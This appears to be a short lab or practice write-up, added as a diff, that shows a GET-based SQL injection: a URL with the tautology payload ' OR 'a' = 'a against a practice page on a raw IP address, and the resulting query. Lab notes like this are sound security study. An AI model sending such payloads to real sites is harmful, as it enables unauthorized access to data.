@@ -1,0 +1,7 @@
+-> GET Based SQL Injection in URL Variant 1
+
+Query: 
+http://13.233.165.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-1/details.php?house=hufflepuff' OR 'a' = 'a
+
+Result:
+SQL Query Used: SELECT name, house FROM hogwarts WHERE house='hufflepuff' OR 'a'='a'
